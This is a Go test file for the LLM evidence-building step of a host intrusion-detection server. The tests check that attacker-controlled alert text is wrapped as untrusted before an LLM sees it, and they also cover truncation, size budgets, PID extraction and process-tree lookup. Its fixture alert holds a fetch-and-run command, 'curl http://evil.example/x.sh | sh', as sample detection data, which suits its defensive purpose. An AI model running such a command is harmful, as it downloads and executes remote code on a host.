// SPDX-License-Identifier: Apache-2.0

package llm

import (
	"context"
	"encoding/json"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/xycxmz/xiezhi-public/server/internal/pipeline"
)

type fakeFetcher struct {
	rows []EventSummary
	err  error
}

func (f *fakeFetcher) RecentByAgent(_ context.Context, _ string, _ int64, _ int) ([]EventSummary, error) {
	return f.rows, f.err
}

type fakeTrees struct {
	mu     sync.Mutex
	called bool
	gotPid int32
	tree   string
	err    error
}

func (f *fakeTrees) SubtreeJSON(_ string, pid int32, _ int) (string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.called = true
	f.gotPid = pid
	return f.tree, f.err
}

func (f *fakeTrees) wasCalled() bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.called
}

func testAlert() *pipeline.Alert {
	return &pipeline.Alert{
		TsMs: time.Now().UnixMilli(), AgentID: "agent-1", Hostname: "web-1",
		RuleID: "exec-curl-pipe-shell", Severity: "high", Mitre: "T1059.004",
		Summary:  `exec curl http://evil.example/x.sh | sh from {"exe":"/usr/bin/bash"}`,
		EventRef: `{"header":{"ts_ms":1},"execve":{"proc":{"pid":4242,"exe":"/usr/bin/curl","argv":["curl","http://evil.example/x.sh"]}}}`,
	}
}

func TestEvidenceUntrustedWrapping(t *testing.T) {
	fetcher := &fakeFetcher{rows: []EventSummary{
		{TsMs: 2, Type: "FILE_OPEN", Body: `{"path":"/tmp/.x","argv":["sh -c curl evil"]}`},
	}}
	trees := &fakeTrees{tree: "bash\n  curl"}
	ev, err := BuildEvidence(context.Background(), testAlert(), 0, fetcher, trees)
	if err != nil {
		t.Fatal(err)
	}
	b, err := ev.MarshalBudgeted()
	if err != nil {
		t.Fatal(err)
	}
	var generic map[string]any
	if err := json.Unmarshal(b, &generic); err != nil {
		t.Fatalf("evidence not JSON: %v", err)
	}
	// 攻击者可控字符串绝不能以裸字符串出现在证据里。
	for _, bare := range []string{
		`"summary":"exec curl`, // alert.summary
		`"trigger_event":"{"`,  // 事件原文
		`"body":"{"`,           // 历史事件体
		`"process_tree":"bash`, // 进程树文本
	} {
		if strings.Contains(string(b), bare) {
			t.Errorf("attacker-controlled string appears bare, want untrusted wrapper: %s", bare)
		}
	}
	alert := generic["alert"].(map[string]any)
	if _, ok := alert["summary"].(map[string]any); !ok {
		t.Errorf("alert.summary not wrapped: %v", alert["summary"])
	}
	if _, ok := generic["trigger_event"].(map[string]any); !ok {
		t.Errorf("trigger_event not wrapped")
	}
	re := generic["recent_events"].([]any)[0].(map[string]any)
	if _, ok := re["body"].(map[string]any); !ok {
		t.Errorf("recent body not wrapped")
	}
	if _, ok := generic["process_tree"].(map[string]any); !ok {
		t.Errorf("process_tree not wrapped")
	}
}

func TestEvidenceTruncation(t *testing.T) {
	a := testAlert()
	a.EventRef = `{"execve":{"proc":{"pid":1,"argv":["` + strings.Repeat("A", 5000) + `"]}}}`
	long := strings.Repeat("B", 500)
	fetcher := &fakeFetcher{rows: []EventSummary{{TsMs: 1, Type: "EXECVE", Body: long}}}
	ev, err := BuildEvidence(context.Background(), a, 0, fetcher, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := len(string(ev.TriggerEvent)); got > triggerEventMaxBytes+64 {
		t.Errorf("trigger_event len=%d exceeds 4KB budget+marker", got)
	}
	if !strings.HasSuffix(string(ev.TriggerEvent), "...(truncated)") {
		t.Errorf("trigger_event missing truncation marker")
	}
	if got := len(string(ev.RecentEvents[0].Body)); got > recentBodyMaxBytes+64 {
		t.Errorf("recent body len=%d exceeds 200B budget+marker", got)
	}
}

// MarshalBudgeted 的丢弃行为直接对纯函数测：BuildEvidence 各段有字节上界
// （200B×20+2KB+4KB≈12KB），当前数学上达不到 24KB 预算——预算是防未来
// 段上界放大的安全网，此测试构造超预算输入验证它真的兜底。
func TestEvidenceBudgetDropsOldest(t *testing.T) {
	ev, err := BuildEvidence(context.Background(), testAlert(), 0, nil, nil)
	if err != nil {
		t.Fatal(err)
	}
	// 最新在前（与 store.RecentEvents ORDER BY ts DESC 一致），单条 400B。
	for i := 0; i < 120; i++ {
		ev.RecentEvents = append(ev.RecentEvents, RecentEvent{
			TsMs: int64(2_000_000 - i),
			Type: "EXECVE",
			Body: Untrusted(strings.Repeat("x", 400)),
		})
	}
	full := len(ev.RecentEvents)
	b, err := ev.MarshalBudgeted()
	if err != nil {
		t.Fatal(err)
	}
	if len(b) > evidenceBudgetBytes {
		t.Errorf("packed evidence %d bytes exceeds budget %d", len(b), evidenceBudgetBytes)
	}
	if len(ev.RecentEvents) == full {
		t.Fatalf("expected some recent events dropped, none were")
	}
	// 最新的必须保留在首位（丢弃从最旧的尾部开始）。
	if got := ev.RecentEvents[0].TsMs; got != int64(2_000_000) {
		t.Errorf("newest event dropped: first ts=%d", got)
	}
	if last, first := ev.RecentEvents[len(ev.RecentEvents)-1].TsMs, ev.RecentEvents[0].TsMs; last >= first {
		t.Errorf("ordering broken after trim: last=%d first=%d", last, first)
	}
}

func TestPIDFromEventRef(t *testing.T) {
	cases := []struct {
		name string
		ref  string
		want int32
	}{
		{"execve", `{"execve":{"proc":{"pid":100}}}`, 100},
		{"net", `{"net":{"proc":{"pid":200}}}`, 200},
		{"ptrace-tracer", `{"ptrace":{"tracer":{"pid":300},"target_pid":9}}`, 300},
		{"exit", `{"exit":{"pid":400}}`, 400},
		{"fork-child", `{"fork":{"parent":1,"childPid":500}}`, 500},
		{"string-pid", `{"misc":{"proc":{"pid":"600"}}}`, 600},
		{"zero-pid", `{"execve":{"proc":{"pid":0}}}`, 0},
		{"no-pid", `{"heartbeat":{"seq":1}}`, 0},
		{"bad-json", `{"execve":{"proc":{"pid":`, 0},
		{"empty", ``, 0},
	}
	for _, c := range cases {
		if got := pidFromEventRef(c.ref); got != c.want {
			t.Errorf("%s: pid=%d want %d", c.name, got, c.want)
		}
	}
}

func TestEvidenceNoPIDSkipsTree(t *testing.T) {
	trees := &fakeTrees{tree: "should not be called"}
	// firstseen 告警：无 EventRef。
	a := testAlert()
	a.RuleID = "firstseen/exe"
	a.EventRef = ""
	ev, err := BuildEvidence(context.Background(), a, 0, nil, trees)
	if err != nil {
		t.Fatal(err)
	}
	if trees.wasCalled() {
		t.Error("SubtreeJSON called without pid")
	}
	if ev.TriggerEvent != "" {
		t.Errorf("trigger_event should be empty for firstseen alert, got %q", ev.TriggerEvent)
	}
	if ev.ProcessTree != "" {
		t.Errorf("process_tree should be empty, got %q", ev.ProcessTree)
	}
}

func TestEvidenceTreeIncluded(t *testing.T) {
	trees := &fakeTrees{tree: "bash\n  curl\n    sh"}
	ev, err := BuildEvidence(context.Background(), testAlert(), 0, nil, trees)
	if err != nil {
		t.Fatal(err)
	}
	if !trees.wasCalled() || trees.gotPid != 4242 {
		t.Errorf("SubtreeJSON not anchored at triggering pid: called=%v pid=%d", trees.wasCalled(), trees.gotPid)
	}
	if string(ev.ProcessTree) != trees.tree {
		t.Errorf("process_tree = %q", ev.ProcessTree)
	}
}

func TestEvidenceFetcherErrorTolerated(t *testing.T) {
	ev, err := BuildEvidence(context.Background(), testAlert(), 0,
		&fakeFetcher{err: context.DeadlineExceeded}, &fakeTrees{err: context.DeadlineExceeded})
	if err != nil {
		t.Fatalf("evidence build must tolerate source errors, got %v", err)
	}
	if len(ev.RecentEvents) != 0 || ev.ProcessTree != "" {
		t.Error("degraded segments should be empty, not fabricated")
	}
}

// pid 相关性重排（R7 证据加厚）：同触发进程的历史事件须排在无关噪音前。
func TestEvidenceRecentEventsPidFirst(t *testing.T) {
	a := testAlert()
	a.EventRef = `{"execve":{"proc":{"pid":4242,"argv":["x"]}}}`
	rows := []EventSummary{
		{TsMs: 1, Type: "EXECVE", Body: `{"noise":true}`},
		{TsMs: 2, Type: "CONNECT", Body: `{"proc":{"pid":4242},"ip":"1.2.3.4"}`},
		{TsMs: 3, Type: "EXECVE", Body: `{"other":1}`},
	}
	ev, err := BuildEvidence(context.Background(), a, 0, &fakeFetcher{rows: rows}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(ev.RecentEvents) != 3 {
		t.Fatalf("rows=%d want 3", len(ev.RecentEvents))
	}
	if !strings.Contains(string(ev.RecentEvents[0].Body), `"pid":4242`) {
		t.Fatalf("first recent event should be pid-relevant, got %s", ev.RecentEvents[0].Body)
	}
}
